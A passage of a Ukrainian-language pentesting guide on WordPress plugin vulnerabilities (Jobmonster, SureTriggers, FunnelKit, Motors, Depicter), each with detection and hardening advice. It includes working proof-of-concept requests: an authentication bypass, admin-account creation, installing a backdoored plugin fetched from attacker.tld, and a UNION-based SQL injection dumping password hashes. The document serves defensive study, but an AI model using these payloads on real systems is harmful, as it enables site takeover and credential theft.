- –í—ñ–¥—Å—É—Ç–Ω—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞ OAuth/OpenID; –≥—ñ–ª–∫–∞ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –ø—Ä–∏–π–º–∞—î –≤—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ –≤—ñ–¥ –∞—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫–∞.
- get_user_by('email', $_POST['id']) —É –ø–æ—î–¥–Ω–∞–Ω–Ω—ñ –∑ wp_set_auth_cookie($uid) –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É—î –∑–∞–ø–∏—Ç—É–≤–∞—á–∞ —è–∫ –±—É–¥—å-—è–∫–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ —ñ—Å–Ω—É—é—á–æ—é –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—é –∞–¥—Ä–µ—Å–æ—é.

–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è (–±–µ–∑ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó)

- –ü–µ—Ä–µ–¥—É–º–æ–≤–∏: –∞—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫ –º–∞—î –¥–æ—Å—Ç—É–ø –¥–æ /wp-admin/admin-ajax.php —ñ –∑–Ω–∞—î/–≤–≥–∞–¥—É—î –¥—ñ–π—Å–Ω—É –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É –∞–¥—Ä–µ—Å—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.
- –í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å provider —É –Ω–µ–ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω–µ –∑–Ω–∞—á–µ–Ω–Ω—è (–∞–±–æ –Ω–µ –≤–∫–∞–∑—É–π—Ç–µ –π–æ–≥–æ), —â–æ–± –ø–æ—Ç—Ä–∞–ø–∏—Ç–∏ –≤ –≥—ñ–ª–∫—É –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —ñ –ø–µ—Ä–µ–¥–∞–π—Ç–µ id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
–û—á—ñ–∫—É–≤–∞–Ω—ñ —ñ–Ω–¥–∏–∫–∞—Ç–æ—Ä–∏ —É—Å–ø—ñ—Ö—É

- HTTP 200 —ñ–∑ JSON —Ç—ñ–ª–æ–º, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞-–∂–µ—Ä—Ç–≤–∏; –Ω–∞—Å—Ç—É–ø–Ω—ñ –∑–∞–ø–∏—Ç–∏ –±—É–¥—É—Ç—å –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω—ñ.

–í–∏–∑–Ω–∞—á–µ–Ω–Ω—è —ñ–º–µ–Ω—ñ action

- –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ç–µ–º—É/–ø–ª–∞–≥—ñ–Ω –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ–π add_action('wp_ajax_nopriv_...', '...') —É –∫–æ–¥—ñ social login (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, framework/add-ons/social-login/class-social-login.php).
- –í–∏–∫–æ–Ω–∞–π—Ç–µ grep –¥–ª—è wp_set_auth_cookie(), get_user_by('email', ...) —É AJAX-—Ö–µ–Ω–¥–ª–µ—Ä–∞—Ö.

–ö–æ–Ω—Ç—Ä–æ–ª—å–Ω–∏–π —Å–ø–∏—Å–æ–∫ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è

- –í–µ–±-–ª–æ–≥–∏, —â–æ –ø–æ–∫–∞–∑—É—é—Ç—å –Ω–µ–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω—ñ POST–∏ –¥–æ /wp-admin/admin-ajax.php –∑ action social-login —ñ id=<email>.
- –í—ñ–¥–ø–æ–≤—ñ–¥—ñ 200 —ñ–∑ success JSON –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –ø–µ—Ä–µ–¥ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–º —Ç—Ä–∞—Ñ—ñ–∫–æ–º –∑ —Ç—ñ—î—ó –∂ IP/User-Agent.

–ü—ñ–¥—Å–∏–ª–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏

- –ù–µ –≤–∏–≤–æ–¥—å—Ç–µ —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å —ñ–∑ –≤—Ö—ñ–¥–Ω–∏—Ö –¥–∞–Ω–∏—Ö –∫–ª—ñ—î–Ω—Ç–∞. –ü—Ä–∏–π–º–∞–π—Ç–µ –ª–∏—à–µ email/ID, —â–æ –ø–æ—Ö–æ–¥—è—Ç—å –≤—ñ–¥ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–æ–≥–æ provider token/ID.
- –í–∏–º–∞–≥–∞–π—Ç–µ CSRF nonces —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ capability –Ω–∞–≤—ñ—Ç—å –¥–ª—è –¥–æ–ø–æ–º—ñ–∂–Ω–∏—Ö –º–µ—Ö–∞–Ω—ñ–∑–º—ñ–≤ –ª–æ–≥—ñ–Ω—É; —É–Ω–∏–∫–∞–π—Ç–µ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó wp_ajax_nopriv_, —è–∫—â–æ —Ü–µ –Ω–µ –∞–±—Å–æ–ª—é—Ç–Ω–æ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ.
- –í–∞–ª—ñ–¥–∏—Ä—É–π—Ç–µ —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ OAuth/OIDC –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞; –≤—ñ–¥–∫–∏–¥–∞–π—Ç–µ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Ö/–Ω–µ–∫–æ—Ä–µ–∫—Ç–Ω–∏—Ö providers (–±–µ–∑ fallback –¥–æ POST id).
- –†–æ–∑–≥–ª—è–Ω—å—Ç–µ —Ç–∏–º—á–∞—Å–æ–≤–µ –≤—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è social login –∞–±–æ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω–µ –ø–∞—Ç—á–µ–Ω–Ω—è –Ω–∞ edge (–∑–∞–±–ª–æ–∫—É–≤–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤—É –¥—ñ—é) –¥–æ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è.

–í–∏–ø—Ä–∞–≤–ª–µ–Ω–∞ –ø–æ–≤–µ–¥—ñ–Ω–∫–∞ (Jobmonster 4.8.0)

- –í–∏–¥–∞–ª–µ–Ω–æ –Ω–µ–±–µ–∑–ø–µ—á–Ω–∏–π fallback —ñ–∑ $_POST['id']; $user_email –º–∞—î –ø–æ—Ö–æ–¥–∏—Ç–∏ –∑ –ø–µ—Ä–µ–≤—ñ—Ä–µ–Ω–∏—Ö –≥—ñ–ª–æ–∫ provider —É switch($_POST['using']).

## –ï—Å–∫–∞–ª–∞—Ü—ñ—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –±–µ–∑ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è REST token/key –¥–ª—è –ø–µ—Ä–µ–¥–±–∞—á—É–≤–∞–Ω–æ—ó —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ (OttoKit/SureTriggers ‚â§ 1.0.82)

–î–µ—è–∫—ñ –ø–ª–∞–≥—ñ–Ω–∏ –≤—ñ–¥–∫—Ä–∏–≤–∞—é—Ç—å REST endpoints, —è–∫—ñ —Å—Ç–≤–æ—Ä—é—é—Ç—å –ø–æ–≤—Ç–æ—Ä–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–Ω—ñ ‚Äúconnection keys‚Äù –∞–±–æ tokens –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ capability –≤–∏–∫–ª–∏–∫–∞—á–∞. –Ø–∫—â–æ –º–∞—Ä—à—Ä—É—Ç –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É—î—Ç—å—Å—è –ª–∏—à–µ –∑–∞ –≤–≥–∞–¥—É–≤–∞–Ω–æ—é –æ–∑–Ω–∞–∫–æ—é (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, username) —ñ –Ω–µ –ø—Ä–∏–≤'—è–∑—É—î –∫–ª—é—á –¥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞/—Å–µ—Å—ñ—ó –∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞–º–∏ capability, –±—É–¥—å-—è–∫–∏–π –Ω–µ–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –∞—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫ –º–æ–∂–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –∫–ª—é—á —ñ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ –¥—ñ—ó (—Å—Ç–≤–æ—Ä–µ–Ω–Ω—è admin-–∞–∫–∞—É–Ω—Ç–∞, –¥—ñ—ó –ø–ª–∞–≥—ñ–Ω—ñ–≤ ‚Üí RCE).

- –í—Ä–∞–∑–ª–∏–≤–∏–π –º–∞—Ä—à—Ä—É—Ç (–ø—Ä–∏–∫–ª–∞–¥): sure-triggers/v1/connection/create-wp-connection
- –ü—Ä–æ–≥–∞–ª–∏–Ω–∞: –ø—Ä–∏–π–º–∞—î username, –≤–∏–¥–∞—î connection key –±–µ–∑ current_user_can() –∞–±–æ —Å—É–≤–æ—Ä–æ–≥–æ permission_callback
- –ù–∞—Å–ª—ñ–¥–æ–∫: –ø–æ–≤–Ω–∏–π takeover —à–ª—è—Ö–æ–º –ø–æ–≤'—è–∑—É–≤–∞–Ω–Ω—è —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ –∫–ª—é—á–∞ –∑ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ–º–∏ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–º–∏ –¥—ñ—è–º–∏

PoC ‚Äì —Å—Ç–≤–æ—Ä—ñ—Ç—å connection key —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–π—Ç–µ –π–æ–≥–æ
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# ‚Üí {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
–ß–æ–º—É —Ü–µ –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏
- –ß—É—Ç–ª–∏–≤–∏–π REST route –∑–∞—Ö–∏—â–µ–Ω–∏–π –ª–∏—à–µ —Å–ª–∞–±–∫–∏–º –¥–æ–∫–∞–∑–æ–º —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ –∑ –Ω–∏–∑—å–∫–æ—é –µ–Ω—Ç—Ä–æ–ø—ñ—î—é (username) –∞–±–æ –≤—ñ–¥—Å—É—Ç–Ω—ñ–º permission_callback
- –ù–µ–º–∞—î –ø—Ä–∏–º—É—Å–æ–≤–æ–≥–æ –∑–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è capability; –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏–π key –ø—Ä–∏–π–º–∞—î—Ç—å—Å—è —è–∫ —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω–∏–π –æ–±—Ö—ñ–¥

Detection checklist
- –®—É–∫–∞—Ç–∏ –≤ –∫–æ–¥—ñ –ø–ª–∞–≥—ñ–Ω–∞ register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- –ë—É–¥—å-—è–∫–∏–π –º–∞—Ä—à—Ä—É—Ç, —â–æ –≤–∏–¥–∞—î tokens/keys –Ω–∞ –æ—Å–Ω–æ–≤—ñ —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ, –ø–µ—Ä–µ–¥–∞–Ω–æ—ó –≤ –∑–∞–ø–∏—Ç—ñ (username/email), –±–µ–∑ –ø—Ä–∏–≤‚Äô—è–∑–∫–∏ –¥–æ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∞–±–æ capability
- –®—É–∫–∞—Ç–∏ –ø–æ–¥–∞–ª—å—à—ñ –º–∞—Ä—à—Ä—É—Ç–∏, —è–∫—ñ –ø—Ä–∏–π–º–∞—é—Ç—å –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏–π token/key –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ capability –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ

Hardening
- –î–ª—è –±—É–¥—å-—è–∫–æ–≥–æ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ–≥–æ REST route: –≤–∏–º–∞–≥–∞—Ç–∏ permission_callback, —è–∫–∏–π –∑–∞—Å—Ç–æ—Å–æ–≤—É—î current_user_can() –¥–ª—è –ø–æ—Ç—Ä—ñ–±–Ω–æ—ó capability
- –ù–µ mint long-lived keys –∑ identity, –Ω–∞–¥–∞–Ω–æ—ó –∫–ª—ñ—î–Ω—Ç–æ–º; —è–∫—â–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ, –≤–∏–¥–∞–≤–∞–π—Ç–µ short-lived, user-bound tokens –ø—ñ—Å–ª—è –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —ñ –ø–æ–≤—Ç–æ—Ä–Ω–æ –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ capability –ø—Ä–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ
- –ü–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ –∫–æ–Ω—Ç–µ–∫—Å—Ç –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫–∏–π –≤–∏–∫–ª–∏–∫–∞—î (wp_set_current_user –Ω–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ —Å–∞–º –ø–æ —Å–æ–±—ñ) —ñ –≤—ñ–¥—Ö–∏–ª—è–π—Ç–µ –∑–∞–ø–∏—Ç–∏, –¥–µ !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse ‚Üí –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∞ –¥–æ–≤—ñ–ª—å–Ω–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø–ª–∞–≥—ñ–Ω–∞ (FunnelKit Automations ‚â§ 3.5.3)

Nonces –∑–∞–ø–æ–±—ñ–≥–∞—é—Ç—å CSRF, –∞ –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó. –Ø–∫—â–æ –∫–æ–¥ —Ç—Ä–∞–∫—Ç—É—î —É—Å–ø—ñ—à–Ω–∏–π nonce —è–∫ –∑–µ–ª–µ–Ω–µ —Å–≤—ñ—Ç–ª–æ —ñ –ø–æ—Ç—ñ–º –ø—Ä–æ–ø—É—Å–∫–∞—î –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ capability –¥–ª—è –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö –æ–ø–µ—Ä–∞—Ü—ñ–π (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, install/activate plugins), –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ñ –∞—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫–∏ –º–æ–∂—É—Ç—å –≤–∏–∫–æ–Ω–∞—Ç–∏ —Å–ª–∞–±–∫—É –ø–µ—Ä–µ–≤—ñ—Ä–∫—É nonce —ñ –¥–æ—Å—è–≥—Ç–∏ RCE, –≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏ backdoored –∞–±–æ –≤—Ä–∞–∑–ª–∏–≤–∏–π –ø–ª–∞–≥—ñ–Ω.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce ‚Äúpasses‚Äù
- Impact: –ø–æ–≤–Ω–∞ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—è —á–µ—Ä–µ–∑ –¥–æ–≤—ñ–ª—å–Ω—É —É—Å—Ç–∞–Ω–æ–≤–∫—É/–∞–∫—Ç–∏–≤–∞—Ü—ñ—é –ø–ª–∞–≥—ñ–Ω–∞

PoC (—Ñ–æ—Ä–º–∞ –∑–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ –ø–ª–∞–≥—ñ–Ω–∞; –Ω–∞–≤–µ–¥–µ–Ω–æ –ª–∏—à–µ –¥–ª—è —ñ–ª—é—Å—Ç—Ä–∞—Ü—ñ—ó)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- Any code path that sets $skip_caps = true after nonce validation

Hardening
- Always treat nonces as CSRF tokens only; enforce capability checks regardless of nonce state
- Require current_user_can('install_plugins') and current_user_can('activate_plugins') before reaching installer code
- Reject unauthenticated access; avoid exposing nopriv AJAX actions for privileged flows

### Subscriber+ AJAX plugin installer ‚Üí forced malicious activation (Motors Theme ‚â§ 5.6.81)

[Patchstack's analysis](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/) –ø–æ–∫–∞–∑–∞–≤, —è–∫ Motors theme –ø–æ—Å—Ç–∞—á–∞—î –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏–π AJAX helper –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –π–æ–≥–æ companion plugin:
```php
add_action('wp_ajax_mvl_theme_install_base', 'mvl_theme_install_base');

function mvl_theme_install_base() {
check_ajax_referer('mvl_theme_install_base', 'nonce');

$plugin_url  = sanitize_text_field($_GET['plugin']);
$plugin_slug = 'motors-car-dealership-classified-listings';

$upgrader = new Plugin_Upgrader(new Motors_Theme_Plugin_Upgrader_Skin(['plugin' => $plugin_slug]));
$upgrader->install($plugin_url);
mvl_theme_activate_plugin($plugin_slug);
}
```
- –í–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è —Ç—ñ–ª—å–∫–∏ `check_ajax_referer()`; –Ω–µ–º–∞—î `current_user_can('install_plugins')` –∞–±–æ `current_user_can('activate_plugins')`.
- Nonce –≤–±—É–¥–æ–≤–∞–Ω–æ –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ Motors, —Ç–æ–º—É –±—É–¥—å-—è–∫–∏–π Subscriber, —è–∫–∏–π –º–æ–∂–µ –≤—ñ–¥–∫—Ä–∏—Ç–∏ `/wp-admin/`, –º–æ–∂–µ —Å–∫–æ–ø—ñ—é–≤–∞—Ç–∏ –π–æ–≥–æ –∑ HTML/JS.
- –û–±—Ä–æ–±–Ω–∏–∫ –¥–æ–≤—ñ—Ä—è—î –∫–µ—Ä–æ–≤–∞–Ω–æ–º—É –∞—Ç–∞–∫—É—é—á–∏–º –ø–∞—Ä–∞–º–µ—Ç—Ä—É `plugin` (–∑—á–∏—Ç—É–≤–∞–Ω–æ–º—É –∑ `$_GET`) —ñ –ø–µ—Ä–µ–¥–∞—î –π–æ–≥–æ –≤ `Plugin_Upgrader::install()`, —Ç–æ–º—É –¥–æ–≤—ñ–ª—å–Ω–∏–π –≤—ñ–¥–¥–∞–ª–µ–Ω–∏–π ZIP –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è –≤ `wp-content/plugins/`.
- –ü—ñ—Å–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–µ–º–∞ –±–µ–∑—É–º–æ–≤–Ω–æ –≤–∏–∫–ª–∏–∫–∞—î `mvl_theme_activate_plugin()`, –≥–∞—Ä–∞–Ω—Ç—É—é—á–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è PHP-–∫–æ–¥—É –∑–ª–æ–≤–º–∏—Å–Ω–æ–≥–æ –ø–ª–∞–≥—ñ–Ω–∞.

#### –ü–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ—Å—Ç—å –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó

1. –ó–∞—Ä–µ—î—Å—Ç—Ä—É–π—Ç–µ/–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–π—Ç–µ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∞–≤–∞–º–∏ (–¥–æ—Å—Ç–∞—Ç–Ω—å–æ Subscriber) —ñ –æ—Ç—Ä–∏–º–∞–π—Ç–µ `mvl_theme_install_base` nonce –∑ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—É –ø–∞–Ω–µ–ª—ñ Motors.
2. –ó–±–µ—Ä—ñ—Ç—å ZIP –ø–ª–∞–≥—ñ–Ω–∞, –≤–µ—Ä—Ö–Ω—ñ–π –∫–∞—Ç–∞–ª–æ–≥ —è–∫–æ–≥–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –æ—á—ñ–∫—É–≤–∞–Ω–æ–º—É slug `motors-car-dealership-classified-listings/`, —ñ –≤–±—É–¥—É–π—Ç–µ backdoor –∞–±–æ webshell —É `*.php` —Ç–æ—á–∫–∏ –≤—Ö–æ–¥—É.
3. –†–æ–∑–º—ñ—Å—Ç—ñ—Ç—å ZIP —Ç–∞ –∑–∞–ø—É—Å—Ç—ñ—Ç—å —ñ–Ω—Å—Ç–∞–ª—è—Ç–æ—Ä, –≤–∫–∞–∑–∞–≤—à–∏ –æ–±—Ä–æ–±–Ω–∏–∫—É –≤–∞—à—É URL:
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Cookie: wordpress_logged_in_=...
Content-Type: application/x-www-form-urlencoded

action=mvl_theme_install_base&nonce=<leaked_nonce>&plugin=https%3A%2F%2Fattacker.tld%2Fmotors-car-dealership-classified-listings.zip
```
–û—Å–∫—ñ–ª—å–∫–∏ –æ–±—Ä–æ–±–Ω–∏–∫ —á–∏—Ç–∞—î `$_GET['plugin']`, —Ç–æ–π –∂–µ payload —Ç–∞–∫–æ–∂ –º–æ–∂–µ –±—É—Ç–∏ –Ω–∞–¥—ñ—Å–ª–∞–Ω–∏–π —á–µ—Ä–µ–∑ query string.

#### Detection checklist

- –®—É–∫–∞–π—Ç–µ –≤ —Ç–µ–º–∞—Ö/–ø–ª–∞–≥—ñ–Ω–∞—Ö `Plugin_Upgrader`, `Theme_Upgrader` –∞–±–æ –∫–∞—Å—Ç–æ–º–Ω—ñ `install_plugin.php` helpers, –ø—ñ–¥–∫–ª—é—á–µ–Ω—ñ –¥–æ `wp_ajax_*` hooks –±–µ–∑ capability checks.
- –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –±—É–¥—å-—è–∫–∏–π –æ–±—Ä–æ–±–Ω–∏–∫, —è–∫–∏–π –ø—Ä–∏–π–º–∞—î –ø–∞—Ä–∞–º–µ—Ç—Ä `plugin`, `package`, `source` –∞–±–æ `url` —ñ –ø–µ—Ä–µ–¥–∞—î –π–æ–≥–æ –≤ upgrader APIs, –æ—Å–æ–±–ª–∏–≤–æ –∫–æ–ª–∏ slug –∂–æ—Ä—Å—Ç–∫–æ –∑–∞–¥–∞–Ω–∏–π, –∞–ª–µ –≤–º—ñ—Å—Ç ZIP –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è.
- –ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ admin-—Å—Ç–æ—Ä—ñ–Ω–∫–∏, —è–∫—ñ –≤—ñ–¥–∫—Ä–∏–≤–∞—é—Ç—å nonces –¥–ª—è installer actions ‚Äî —è–∫—â–æ Subscribers –º–æ–∂—É—Ç—å –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Å—Ç–æ—Ä—ñ–Ω–∫—É, –ø—Ä–∏–ø—É—Å–∫–∞–π—Ç–µ, —â–æ nonce leaks.

#### Hardening

- –û–±–º–µ–∂—É–π—Ç–µ installer AJAX callbacks –ø–µ—Ä–µ–≤—ñ—Ä–∫–æ—é `current_user_can('install_plugins')` —ñ `current_user_can('activate_plugins')` –ø—ñ—Å–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ nonce; Motors 5.6.82 –≤–≤–µ–ª–∞ —Ü—é –ø–µ—Ä–µ–≤—ñ—Ä–∫—É –¥–ª—è –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –±–∞–≥–∞.
- –í—ñ–¥–º–æ–≤–ª—è–π—Ç–µ –Ω–µ–Ω–∞–¥—ñ–π–Ω–∏–º URL: –æ–±–º–µ–∂—É–π—Ç–µ installers –≤–±—É–¥–æ–≤–∞–Ω–∏–º–∏ ZIP –∞–±–æ trusted repositories, –∞–±–æ –≤–∏–º–∞–≥–∞–π—Ç–µ signed download manifests.
- –†–æ–∑–≥–ª—è–¥–∞–π—Ç–µ nonces –≤–∏–∫–ª—é—á–Ω–æ —è–∫ CSRF tokens; –≤–æ–Ω–∏ –Ω–µ –Ω–∞–¥–∞—é—Ç—å authorization —ñ –Ω—ñ–∫–æ–ª–∏ –Ω–µ –ø–æ–≤–∏–Ω–Ω—ñ –∑–∞–º—ñ–Ω—é–≤–∞—Ç–∏ capability checks.

---

## –ù–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏–π SQLi —á–µ—Ä–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä s (search) –≤ –¥—ñ—è—Ö depicter-* (Depicter Slider ‚â§ 3.6.1)

–ö—ñ–ª—å–∫–∞ –¥—ñ–π depicter-* –ø—Ä–∏–π–º–∞–ª–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä s (search) —ñ –∫–æ–Ω–∫–∞—Ç–µ–Ω—É–≤–∞–ª–∏ –π–æ–≥–æ –≤ SQL-–∑–∞–ø–∏—Ç–∏ –±–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–∞—Ü—ñ—ó.

- Parameter: s (search)
- Flaw: direct string concatenation in WHERE/LIKE clauses; no prepared statements/sanitization
- Impact: –µ–∫–∑—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—è –±–∞–∑–∏ –¥–∞–Ω–∏—Ö (–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ, —Ö–µ—à—ñ), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Grep for depicter-* action handlers and direct use of $_GET['s'] or $_POST['s'] in SQL
- Review custom queries passed to $wpdb->get_results()/query() concatenating s

Hardening
- Always use $wpdb->prepare() or wpdb placeholders; reject unexpected metacharacters server-side
- Add a strict allowlist for s and normalize to expected charset/length

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder ‚â§ 2.5.1)

